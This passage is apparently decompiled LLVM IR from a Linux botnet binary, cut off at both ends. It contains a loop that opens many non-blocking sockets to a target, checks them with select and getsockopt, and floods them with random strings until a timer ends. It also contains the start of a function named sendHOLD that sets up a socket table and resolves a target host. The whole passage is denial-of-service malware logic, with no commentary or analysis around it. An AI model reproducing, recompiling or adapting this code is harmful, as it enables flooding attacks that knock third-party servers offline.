  br label %dec_label_pc_804efd8

dec_label_pc_804ed64:                             ; preds = %dec_label_pc_804efcc.preheader, %dec_label_pc_804efc9
  %storemerge40 = phi i32 [ %v4_804efc9, %dec_label_pc_804efc9 ], [ 0, %dec_label_pc_804efcc.preheader ]
  %stack_var_-192.139 = phi i32 [ %stack_var_-192.0, %dec_label_pc_804efc9 ], [ %stack_var_-192.2, %dec_label_pc_804efcc.preheader ]
  store i32 %storemerge40, i32* %eax.global-to-local, align 4
  store i32 %v2_804ece8, i32* %edx.global-to-local, align 4
  %v2_804ed6a = mul i32 %storemerge40, 8
  %v4_804ed6a = add i32 %v2_804ed6a, %v3_804ed6a
  %v5_804ed6a = inttoptr i32 %v4_804ed6a to i8*
  %v6_804ed6a = load i8, i8* %v5_804ed6a, align 4
  %v7_804ed6a = zext i8 %v6_804ed6a to i32
  %v9_804ed6a = and i32 %storemerge40, -256
  %v10_804ed6a = or i32 %v7_804ed6a, %v9_804ed6a
  store i32 %v10_804ed6a, i32* %eax.global-to-local, align 4
  store i32 %v7_804ed6a, i32* %edx.global-to-local, align 4
  %v8_804ed7b = icmp eq i8 %v6_804ed6a, 0
  %v12_804ed7b = icmp eq i8 %v6_804ed6a, 1
  br i1 %v12_804ed7b, label %dec_label_pc_804ee4b, label %dec_label_pc_804ed88

dec_label_pc_804ed88:                             ; preds = %dec_label_pc_804ed64
  %v12_804ed88 = icmp eq i8 %v6_804ed6a, 2
  br i1 %v12_804ed88, label %dec_label_pc_804ef69, label %dec_label_pc_804ed95

dec_label_pc_804ed95:                             ; preds = %dec_label_pc_804ed88
  br i1 %v8_804ed7b, label %dec_label_pc_804eda3, label %dec_label_pc_804efc9

dec_label_pc_804eda3:                             ; preds = %dec_label_pc_804ed95
  store i32 %storemerge40, i32* @ebx, align 4
  %v0_804eda6 = load i32, i32* @esp, align 4
  %v1_804eda9 = add i32 %v0_804eda6, -8
  %v2_804eda9 = inttoptr i32 %v1_804eda9 to i32*
  store i32 0, i32* %v2_804eda9, align 4
  %v1_804edab = add i32 %v0_804eda6, -12
  %v2_804edab = inttoptr i32 %v1_804edab to i32*
  store i32 1, i32* %v2_804edab, align 4
  %v1_804edad = add i32 %v0_804eda6, -16
  %v2_804edad = inttoptr i32 %v1_804edad to i32*
  store i32 2, i32* %v2_804edad, align 4
  %v2_804edaf = load i32, i32* %stack_var_-204, align 4
  %v3_804edaf = call i32 @socket(i32 %v7_804ed6a, i32 %v12_804ec55, i32 %v2_804edaf)
  %v2_804edbc = load i32, i32* @ebx, align 4
  %v3_804edbc = mul i32 %v2_804edbc, 8
  %v4_804edbc = add i32 %v3_804edbc, %v2_804ece8
  %v5_804edbc = inttoptr i32 %v4_804edbc to i32*
  store i32 %v3_804edaf, i32* %v5_804edbc, align 8
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v3_804edc5 = add i32 %v2_804ed6a, %v2_804ece8
  %v4_804edc5 = inttoptr i32 %v3_804edc5 to i32*
  %v5_804edc5 = load i32, i32* %v4_804edc5, align 8
  store i32 %v5_804edc5, i32* %eax.global-to-local, align 4
  %v0_804edc8 = load i32, i32* @esp, align 4
  %v1_804edcb = add i32 %v0_804edc8, -8
  %v2_804edcb = inttoptr i32 %v1_804edcb to i32*
  store i32 0, i32* %v2_804edcb, align 4
  %v1_804edcd = add i32 %v0_804edc8, -12
  %v2_804edcd = inttoptr i32 %v1_804edcd to i32*
  store i32 3, i32* %v2_804edcd, align 4
  %v0_804edcf = load i32, i32* %eax.global-to-local, align 4
  %v2_804edcf = add i32 %v0_804edc8, -16
  %v3_804edcf = inttoptr i32 %v2_804edcf to i32*
  store i32 %v0_804edcf, i32* %v3_804edcf, align 4
  %v2_804edd0 = load i32, i32* %stack_var_-204, align 4
  %v3_804edd0 = call i32 @__libc_fcntl(i32 %v7_804ed6a, i32 %v12_804ec55, i32 %v2_804edd0)
  %v0_804edd5 = load i32, i32* @esp, align 4
  %v12_804edda = or i32 %v3_804edd0, 2048
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804ede3 = load i32, i32* %v4_804edc5, align 8
  store i32 %v5_804ede3, i32* %eax.global-to-local, align 4
  %v2_804ede9 = add i32 %v0_804edd5, 8
  %v3_804ede9 = inttoptr i32 %v2_804ede9 to i32*
  store i32 %v12_804edda, i32* %v3_804ede9, align 4
  %v1_804edea = add i32 %v0_804edd5, 4
  %v2_804edea = inttoptr i32 %v1_804edea to i32*
  store i32 4, i32* %v2_804edea, align 4
  %v0_804edec = load i32, i32* %eax.global-to-local, align 4
  %v3_804edec = inttoptr i32 %v0_804edd5 to i32*
  store i32 %v0_804edec, i32* %v3_804edec, align 4
  %v2_804eded = load i32, i32* %stack_var_-204, align 4
  %v3_804eded = call i32 @__libc_fcntl(i32 %v7_804ed6a, i32 %v12_804ec55, i32 %v2_804eded)
  %v0_804edf2 = load i32, i32* @esp, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804edfe = load i32, i32* %v4_804edc5, align 8
  store i32 %v5_804edfe, i32* %eax.global-to-local, align 4
  %v1_804ee04 = add i32 %v0_804edf2, 8
  %v2_804ee04 = inttoptr i32 %v1_804ee04 to i32*
  store i32 16, i32* %v2_804ee04, align 4
  %v2_804ee06 = add i32 %v0_804edf2, 4
  %v3_804ee06 = inttoptr i32 %v2_804ee06 to i32*
  store i32 %v2_804ec97, i32* %v3_804ee06, align 4
  %v0_804ee07 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ee07 = inttoptr i32 %v0_804edf2 to i32*
  store i32 %v0_804ee07, i32* %v3_804ee07, align 4
  %v2_804ee08 = load i32, i32* %stack_var_-204, align 4
  %v3_804ee08 = call i32 @__libc_connect(i32 %v7_804ed6a, i32 %v12_804ec55, i32 %v2_804ee08)
  store i32 %v3_804ee08, i32* %eax.global-to-local, align 4
  %v0_804ee0d = load i32, i32* @esp, align 4
  %v1_804ee0d = add i32 %v0_804ee0d, 16
  %v10_804ee10 = icmp eq i32 %v3_804ee08, -1
  %v1_804ee13 = icmp eq i1 %v10_804ee10, false
  br i1 %v1_804ee13, label %dec_label_pc_804ee21, label %dec_label_pc_804ee15

dec_label_pc_804ee15:                             ; preds = %dec_label_pc_804eda3
  %v1_804ee15 = call i32 @__errno_location(i32 %v7_804ed6a)
  store i32 %v1_804ee15, i32* %eax.global-to-local, align 4
  %v1_804ee1a = inttoptr i32 %v1_804ee15 to i32*
  %v2_804ee1a = load i32, i32* %v1_804ee1a, align 4
  store i32 %v2_804ee1a, i32* %eax.global-to-local, align 4
  %v9_804ee1c = icmp eq i32 %v2_804ee1a, 115
  br i1 %v9_804ee1c, label %dec_label_pc_804ee3b, label %dec_label_pc_804ee15.dec_label_pc_804ee21_crit_edge

dec_label_pc_804ee15.dec_label_pc_804ee21_crit_edge: ; preds = %dec_label_pc_804ee15
  %v0_804ee2a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee21

dec_label_pc_804ee21:                             ; preds = %dec_label_pc_804ee15.dec_label_pc_804ee21_crit_edge, %dec_label_pc_804eda3
  %v0_804ee2a = phi i32 [ %v0_804ee2a.pre, %dec_label_pc_804ee15.dec_label_pc_804ee21_crit_edge ], [ %v1_804ee0d, %dec_label_pc_804eda3 ]
  store i32 %storemerge40, i32* %eax.global-to-local, align 4
  store i32 %v2_804ece8, i32* %edx.global-to-local, align 4
  %v5_804ee27 = load i32, i32* %v4_804edc5, align 8
  store i32 %v5_804ee27, i32* %eax.global-to-local, align 4
  %v2_804ee2d = add i32 %v0_804ee2a, -16
  %v3_804ee2d = inttoptr i32 %v2_804ee2d to i32*
  store i32 %v5_804ee27, i32* %v3_804ee2d, align 4
  %v1_804ee2e = call i32 @__libc_close(i32 %v7_804ed6a)
  store i32 %v1_804ee2e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804efc9

dec_label_pc_804ee3b:                             ; preds = %dec_label_pc_804ee15
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804ed6a, align 4
  br label %dec_label_pc_804efc9

dec_label_pc_804ee4b:                             ; preds = %dec_label_pc_804ed64
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804ee55, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804ee5c = call i8* @_memset(i8* %tmp35, i32 0, i32 32)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v3_804ee6a = add i32 %v2_804ed6a, %v2_804ece8
  %v4_804ee6a = inttoptr i32 %v3_804ee6a to i32*
  %v5_804ee6a = load i32, i32* %v4_804ee6a, align 8
  %v2_804ee6f = udiv i32 %v5_804ee6a, 32
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804ee78 = load i32, i32* %v4_804ee6a, align 8
  %v1_804ee7b = urem i32 %v5_804ee78, 32
  store i32 %v1_804ee7b, i32* %eax.global-to-local, align 4
  %v0_804ee7e = load i32, i32* @ebp, align 4
  %v2_804ee7e = mul nuw nsw i32 %v2_804ee6f, 4
  %v3_804ee7e = add nsw i32 %v2_804ee7e, -184
  %v4_804ee7e = add i32 %v3_804ee7e, %v0_804ee7e
  %v5_804ee7e = inttoptr i32 %v4_804ee7e to i32*
  %v6_804ee7e = load i32, i32* %v5_804ee7e, align 4
  %v9_804ee7e = shl i32 1, %v1_804ee7b
  %v12_804ee7e = or i32 %v6_804ee7e, %v9_804ee7e
  store i32 %v12_804ee7e, i32* %v5_804ee7e, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804eea0 = load i32, i32* %v4_804ee6a, align 8
  %v1_804eea3 = add i32 %v5_804eea0, 1
  store i32 %v1_804eea3, i32* %edx.global-to-local, align 4
  %v0_804eea6 = load i32, i32* @esp, align 4
  %v2_804eeaf = add i32 %v0_804eea6, -16
  %v3_804eeaf = inttoptr i32 %v2_804eeaf to i32*
  store i32 %v2_804eea9, i32* %v3_804eeaf, align 4
  %v1_804eeb0 = add i32 %v0_804eea6, -20
  %v2_804eeb0 = inttoptr i32 %v1_804eeb0 to i32*
  store i32 0, i32* %v2_804eeb0, align 4
  store i32 %v2_804ee55, i32* %eax.global-to-local, align 4
  %v2_804eeb8 = add i32 %v0_804eea6, -24
  %v3_804eeb8 = inttoptr i32 %v2_804eeb8 to i32*
  store i32 %v2_804ee55, i32* %v3_804eeb8, align 4
  %v1_804eeb9 = add i32 %v0_804eea6, -28
  %v2_804eeb9 = inttoptr i32 %v1_804eeb9 to i32*
  store i32 0, i32* %v2_804eeb9, align 4
  %v0_804eebb = load i32, i32* %edx.global-to-local, align 4
  %v2_804eebb = add i32 %v0_804eea6, -32
  %v3_804eebb = inttoptr i32 %v2_804eebb to i32*
  store i32 %v0_804eebb, i32* %v3_804eebb, align 4
  %v0_804eebc = load i32, i32* %stack_var_-196, align 4
  %v2_804eebc = load i32, i32* %stack_var_-188, align 4
  %v5_804eebc = call i32 @__libc_select(i32 %v0_804eebc, i32 10000, i32 %v2_804eebc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804eebc, i32* %eax.global-to-local, align 4
  %v0_804eec1 = load i32, i32* @esp, align 4
  %v12_804eec7 = icmp eq i32 %v5_804eebc, 1
  %v1_804eecb = icmp eq i1 %v12_804eec7, false
  br i1 %v1_804eecb, label %dec_label_pc_804ef3d, label %dec_label_pc_804eecd

dec_label_pc_804eecd:                             ; preds = %dec_label_pc_804ee4b
  store i32 4, i32* %stack_var_-200, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804eedd = load i32, i32* %v4_804ee6a, align 8
  store i32 %v5_804eedd, i32* %edx.global-to-local, align 4
  %v2_804eee9 = add i32 %v0_804eec1, 16
  %v3_804eee9 = inttoptr i32 %v2_804eee9 to i32*
  store i32 %v2_804eee3, i32* %v3_804eee9, align 4
  store i32 %v2_804eeea, i32* %eax.global-to-local, align 4
  %v2_804eef0 = add i32 %v0_804eec1, 12
  %v3_804eef0 = inttoptr i32 %v2_804eef0 to i32*
  store i32 %v2_804eeea, i32* %v3_804eef0, align 4
  %v1_804eef1 = add i32 %v0_804eec1, 8
  %v2_804eef1 = inttoptr i32 %v1_804eef1 to i32*
  store i32 4, i32* %v2_804eef1, align 4
  %v1_804eef3 = add i32 %v0_804eec1, 4
  %v2_804eef3 = inttoptr i32 %v1_804eef3 to i32*
  store i32 1, i32* %v2_804eef3, align 4
  %v0_804eef5 = load i32, i32* %edx.global-to-local, align 4
  %v3_804eef5 = inttoptr i32 %v0_804eec1 to i32*
  store i32 %v0_804eef5, i32* %v3_804eef5, align 4
  %v0_804eef6 = load i32, i32* %stack_var_-200, align 4
  %v1_804eef6 = load i32, i32* %stack_var_-196, align 4
  %v3_804eef6 = load i32, i32* %stack_var_-188, align 4
  %v5_804eef6 = call i32 @getsockopt(i32 %v0_804eef6, i32 %v1_804eef6, i32 10000, i32 %v3_804eef6, i32 ptrtoint (i32* @0 to i32))
  %v0_804eefb = load i32, i32* @esp, align 4
  %v3_804eefe = load i32, i32* %stack_var_-204, align 4
  %v1_804ef04 = icmp eq i32 %v3_804eefe, 0
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  br i1 %v1_804ef04, label %dec_label_pc_804ef2d, label %dec_label_pc_804ef08

dec_label_pc_804ef08:                             ; preds = %dec_label_pc_804eecd
  %v5_804ef0e = load i32, i32* %v4_804ee6a, align 8
  store i32 %v5_804ef0e, i32* %eax.global-to-local, align 4
  %v2_804ef14 = add i32 %v0_804eefb, 16
  %v3_804ef14 = inttoptr i32 %v2_804ef14 to i32*
  store i32 %v5_804ef0e, i32* %v3_804ef14, align 4
  %v0_804ef15 = load i32, i32* %stack_var_-200, align 4
  %v1_804ef15 = call i32 @__libc_close(i32 %v0_804ef15)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ed6a, align 4
  br label %dec_label_pc_804efc9

dec_label_pc_804ef2d:                             ; preds = %dec_label_pc_804eecd
  store i8 2, i8* %v5_804ed6a, align 4
  br label %dec_label_pc_804efc9

dec_label_pc_804ef3d:                             ; preds = %dec_label_pc_804ee4b
  %v13_804ef3d = icmp eq i32 %v5_804eebc, -1
  %v1_804ef41 = icmp eq i1 %v13_804ef3d, false
  br i1 %v1_804ef41, label %dec_label_pc_804efc9, label %dec_label_pc_804ef47

dec_label_pc_804ef47:                             ; preds = %dec_label_pc_804ef3d
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804ef4d = load i32, i32* %v4_804ee6a, align 8
  store i32 %v5_804ef4d, i32* %eax.global-to-local, align 4
  %v2_804ef53 = add i32 %v0_804eec1, 16
  %v3_804ef53 = inttoptr i32 %v2_804ef53 to i32*
  store i32 %v5_804ef4d, i32* %v3_804ef53, align 4
  %v1_804ef54 = call i32 @__libc_close(i32 %v5_804eebc)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ed6a, align 4
  br label %dec_label_pc_804efc9

dec_label_pc_804ef69:                             ; preds = %dec_label_pc_804ed88
  %v0_804ef69 = load i32, i32* @esp, align 4
  %v1_804ef69 = add i32 %v0_804ef69, -4
  %v2_804ef69 = inttoptr i32 %v1_804ef69 to i32*
  store i32 1024, i32* %v2_804ef69, align 4
  %v5_804ef6e = add i32 %v0_804ef69, -8
  %v6_804ef6e = inttoptr i32 %v5_804ef6e to i32*
  store i32 %v1_804ed1c, i32* %v6_804ef6e, align 4
  %v2_804ef71 = inttoptr i32 %v7_804ed6a to i8*
  %v3_804ef71 = call i32 @makeRandomStr(i8* %v2_804ef71, i32 %v12_804ec55)
  %v0_804ef76 = load i32, i32* @esp, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v3_804ef7f = add i32 %v2_804ed6a, %v2_804ece8
  %v4_804ef7f = inttoptr i32 %v3_804ef7f to i32*
  %v5_804ef7f = load i32, i32* %v4_804ef7f, align 8
  store i32 %v5_804ef7f, i32* %eax.global-to-local, align 4
  %v1_804ef82 = add i32 %v0_804ef76, 4
  %v2_804ef82 = inttoptr i32 %v1_804ef82 to i32*
  store i32 16384, i32* %v2_804ef82, align 4
  %v2_804ef87 = inttoptr i32 %v0_804ef76 to i32*
  store i32 1024, i32* %v2_804ef87, align 4
  %v5_804ef8c = add i32 %v0_804ef76, -4
  %v6_804ef8c = inttoptr i32 %v5_804ef8c to i32*
  store i32 %v1_804ed1c, i32* %v6_804ef8c, align 4
  %v0_804ef8f = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef8f = add i32 %v0_804ef76, -8
  %v3_804ef8f = inttoptr i32 %v2_804ef8f to i32*
  store i32 %v0_804ef8f, i32* %v3_804ef8f, align 4
  %v0_804ef90 = load i32, i32* %stack_var_-200, align 4
  %v1_804ef90 = load i32, i32* %stack_var_-196, align 4
  %v3_804ef90 = load i32, i32* %stack_var_-188, align 4
  %v4_804ef90 = call i32 @__libc_send(i32 %v0_804ef90, i32 %v1_804ef90, i32 %stack_var_-192.139, i32 %v3_804ef90)
  store i32 %v4_804ef90, i32* %eax.global-to-local, align 4
  %v10_804ef98 = icmp eq i32 %v4_804ef90, -1
  %v1_804ef9b = icmp eq i1 %v10_804ef98, false
  br i1 %v1_804ef9b, label %dec_label_pc_804efc9, label %dec_label_pc_804ef9d

dec_label_pc_804ef9d:                             ; preds = %dec_label_pc_804ef69
  %v0_804ef9d = load i32, i32* %stack_var_-200, align 4
  %v1_804ef9d = call i32 @__errno_location(i32 %v0_804ef9d)
  store i32 %v1_804ef9d, i32* %eax.global-to-local, align 4
  %v1_804efa2 = inttoptr i32 %v1_804ef9d to i32*
  %v2_804efa2 = load i32, i32* %v1_804efa2, align 4
  store i32 %v2_804efa2, i32* %eax.global-to-local, align 4
  %v9_804efa4 = icmp eq i32 %v2_804efa2, 11
  br i1 %v9_804efa4, label %dec_label_pc_804efc9, label %dec_label_pc_804efa9

dec_label_pc_804efa9:                             ; preds = %dec_label_pc_804ef9d
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  %v5_804efaf = load i32, i32* %v4_804ef7f, align 8
  store i32 %v5_804efaf, i32* %eax.global-to-local, align 4
  %v0_804efb2 = load i32, i32* @esp, align 4
  %v2_804efb5 = add i32 %v0_804efb2, -16
  %v3_804efb5 = inttoptr i32 %v2_804efb5 to i32*
  store i32 %v5_804efaf, i32* %v3_804efb5, align 4
  %v0_804efb6 = load i32, i32* %stack_var_-200, align 4
  %v1_804efb6 = call i32 @__libc_close(i32 %v0_804efb6)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804ece8, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804ed6a, align 4
  br label %dec_label_pc_804efc9

dec_label_pc_804efc9:                             ; preds = %dec_label_pc_804ed95, %dec_label_pc_804ef9d, %dec_label_pc_804ef69, %dec_label_pc_804ef3d, %dec_label_pc_804ef47, %dec_label_pc_804ef2d, %dec_label_pc_804ef08, %dec_label_pc_804ee3b, %dec_label_pc_804ee21, %dec_label_pc_804efa9
  %stack_var_-192.0 = phi i32 [ 10000, %dec_label_pc_804ef3d ], [ 10000, %dec_label_pc_804ef47 ], [ 10000, %dec_label_pc_804ef2d ], [ 10000, %dec_label_pc_804ef08 ], [ %stack_var_-192.139, %dec_label_pc_804ef69 ], [ %stack_var_-192.139, %dec_label_pc_804ef9d ], [ %stack_var_-192.139, %dec_label_pc_804efa9 ], [ %stack_var_-192.139, %dec_label_pc_804ee21 ], [ %stack_var_-192.139, %dec_label_pc_804ee3b ], [ %stack_var_-192.139, %dec_label_pc_804ed95 ]
  %v4_804efc9 = add nuw nsw i32 %storemerge40, 1
  store i32 %v4_804efc9, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804efc9, %v2_804ec71
  br i1 %exitcond, label %dec_label_pc_804efcc.dec_label_pc_804efd8.loopexit_crit_edge, label %dec_label_pc_804ed64

dec_label_pc_804efcc.dec_label_pc_804efd8.loopexit_crit_edge: ; preds = %dec_label_pc_804efc9
  %v0_804efd8.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804efd8

dec_label_pc_804efd8:                             ; preds = %dec_label_pc_804efcc.preheader, %dec_label_pc_804efcc.dec_label_pc_804efd8.loopexit_crit_edge, %dec_label_pc_804ecb2
  %v0_804efd8 = phi i32 [ %v1_804ed4a, %dec_label_pc_804ecb2 ], [ %v0_804efd8.pre.pre, %dec_label_pc_804efcc.dec_label_pc_804efd8.loopexit_crit_edge ], [ %v1_804efe2, %dec_label_pc_804efcc.preheader ]
  %stack_var_-192.2 = phi i32 [ %tmp4, %dec_label_pc_804ecb2 ], [ %stack_var_-192.0, %dec_label_pc_804efcc.dec_label_pc_804efd8.loopexit_crit_edge ], [ %stack_var_-192.2, %dec_label_pc_804efcc.preheader ]
  %stack_var_-36.0 = phi i32 [ %tmp8, %dec_label_pc_804ecb2 ], [ %v2_804ec71, %dec_label_pc_804efcc.dec_label_pc_804efd8.loopexit_crit_edge ], [ 0, %dec_label_pc_804efcc.preheader ]
  %v1_804efdb = add i32 %v0_804efd8, -16
  %v2_804efdb = inttoptr i32 %v1_804efdb to i32*
  store i32 0, i32* %v2_804efdb, align 4
  %v1_804efdd = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_804efdd = call i32 @__GI_time(i32* %v1_804efdd)
  store i32 %v2_804efdd, i32* %eax.global-to-local, align 4
  %v5_804efe8 = icmp slt i32 %v2_804efdd, %v5_804ed4d
  br i1 %v5_804efe8, label %dec_label_pc_804efcc.preheader, label %dec_label_pc_804efee

dec_label_pc_804efcc.preheader:                   ; preds = %dec_label_pc_804efd8
  %v0_804efe2 = load i32, i32* @esp, align 4
  %v1_804efe2 = add i32 %v0_804efe2, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804efd238, label %dec_label_pc_804ed64, label %dec_label_pc_804efd8

dec_label_pc_804efee:                             ; preds = %dec_label_pc_804efd8, %entry
  %v0_804effa = phi i32 [ %v3_804eca1, %entry ], [ %v2_804efdd, %dec_label_pc_804efd8 ]
  %v2_804eff7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804eff7, i32* @ebx, align 4
  store i32 %v0_804ec53, i32* @edi, align 4
  ret i32 %v0_804effa

; uselistorder directives
  uselistorder i32 %v4_804efc9, { 1, 2, 0 }
  uselistorder i32 %stack_var_-192.0, { 1, 0 }
  uselistorder i32 %v0_804ef76, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804eec1, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804eebc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ee7b, { 1, 0 }
  uselistorder i32* %v4_804ee6a, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_804edd5, { 2, 0, 1 }
  uselistorder i32 %v7_804ed6a, { 7, 2, 1, 3, 4, 5, 6, 8, 0 }
  uselistorder i8* %v5_804ed6a, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-192.139, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge40, { 0, 13, 12, 11, 7, 6, 10, 9, 8, 5, 4, 3, 19, 18, 17, 16, 15, 14, 20, 1, 2 }
  uselistorder i32 %v2_804ed05, { 1, 0 }
  uselistorder i32 %v2_804ece8, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 4, 5 }
  uselistorder i32 %v1_804ec7f, { 1, 0 }
  uselistorder i32 %v2_804ec71, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804ec63, { 1, 0, 2 }
  uselistorder i32 %v12_804ec55, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-200, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %stack_var_-204, { 4, 3, 1, 0, 2, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 52, 43, 42, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder label %dec_label_pc_804efc9, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804effe = load i32, i32* @edi, align 4
  %v0_804efff = load i32, i32* @ebx, align 4
  store i32 %v0_804efff, i32* %stack_var_-12, align 4
  %v12_804f000 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804f000, i32* %eax.global-to-local, align 4
  %v1_804f00e = call i32 @getdtablesize(i32 %v12_804f000)
  store i32 %v1_804f00e, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804f00e, 0
  %v2_804f017 = zext i1 %tmp to i32
  %v2_804f01a = add i32 %v2_804f017, %v1_804f00e
  %v2_804f01c = sdiv i32 %v2_804f01a, 2
  store i32 2, i32* %stack_var_-68, align 4
  %v1_804f02a = urem i32 %arg2, 65536
  store i32 %v1_804f02a, i32* %eax.global-to-local, align 4
  %v1_804f033 = call i32 @htons(i32 %v1_804f02a)
  %v2_804f042 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804f045 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804f045, i32* %eax.global-to-local, align 4
  %v3_804f04c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804f04c, i32* %eax.global-to-local, align 4
  %v1_804f054 = icmp eq i32 %v3_804f04c, 0
  br i1 %v1_804f054, label %dec_label_pc_804f05d, label %dec_label_pc_804f3de

dec_label_pc_804f05d:                             ; preds = %entry
  %v2_804f073 = mul i32 %v2_804f01c, 8
  %v1_804f079 = add i32 %v2_804f073, 30
  %v2_804f07c = and i32 %v1_804f079, -16
  %v2_804f082 = sub i32 %v12_804f000, %v2_804f07c
  %v1_804f090 = add i32 %v2_804f082, 15
  %v2_804f093 = and i32 %v1_804f090, -16
  %v2_804f0b0 = mul i32 %v2_804f01c, 5
  store i32 %v2_804f0b0, i32* %edx.global-to-local, align 4
  %v1_804f0b6 = inttoptr i32 %v2_804f093 to i8*
  store i32 %v2_804f093, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804f0bb = and i32 %v1_804f090, -256
  store i32 %v1_804f0bb, i32* %eax.global-to-local, align 4
  %v5_804f0bd = call i8* @_memset(i8* %v1_804f0b6, i32 %v1_804f0bb, i32 %v2_804f0b0)
  %v0_804f0bf = load i32, i32* @esp, align 4
  %v1_804f0c2 = add i32 %v0_804f0bf, -16
  %v2_804f0c2 = inttoptr i32 %v1_804f0c2 to i32*
  store i32 1024, i32* %v2_804f0c2, align 4
  %v1_804f0c7 = call i32 @malloc(i32 %v2_804f093)
  %v0_804f0cc = load i32, i32* @esp, align 4
  store i32 %v1_804f0c7, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804f0df = add i32 %v0_804f0cc, 8
  %v3_804f0df = inttoptr i32 %v2_804f0df to i32*
  store i32 1024, i32* %v3_804f0df, align 4
  %v1_804f0e0 = add i32 %v0_804f0cc, 4
  %v2_804f0e0 = inttoptr i32 %v1_804f0e0 to i32*
  store i32 0, i32* %v2_804f0e0, align 4
  %v0_804f0e2 = load i32, i32* %edx.global-to-local, align 4
  %v3_804f0e2 = inttoptr i32 %v0_804f0cc to i32*
  store i32 %v0_804f0e2, i32* %v3_804f0e2, align 4
  %v3_804f0e3 = inttoptr i32 %v1_804f0c7 to i8*
  %v4_804f0e3 = call i32 @__GI_memset(i8* %v3_804f0e3, i32 %tmp11, i32 %tmp8)
